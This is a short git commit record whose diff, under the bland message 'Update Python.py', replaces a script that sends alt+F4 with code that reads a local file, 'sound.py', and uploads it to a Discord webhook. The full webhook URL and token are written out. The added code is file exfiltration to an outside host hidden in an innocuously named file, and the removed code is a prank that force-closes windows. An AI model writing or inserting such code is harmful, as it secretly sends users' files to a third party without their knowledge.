1b7a760f301cfaaec0006e5950f2767de7f71af5
sudoaptinstalllevi <fcloudservice@gmail.com>
2025-06-29 13:36:39 +1000

    Update Python.py

--- Python.py
+++ Python.py
@@ -1,4 +1,7 @@
-import time
-import pyautogui
+import requests
 
-pyautogui.hotkey("alt", "f4")
+file_path = "sound.py"
+webhook = "https://discord.com/api/webhooks/1388724725794078892/oHMo46lgqtouiOQDmso5iGQkoXvGWTe4YU6T5CJEHfAhWxTM1vdDizoDw7KIZusOrGxw"
+
+with open(file_path, 'rb') as f:
+    requests.post(webhook, files={"file": f})
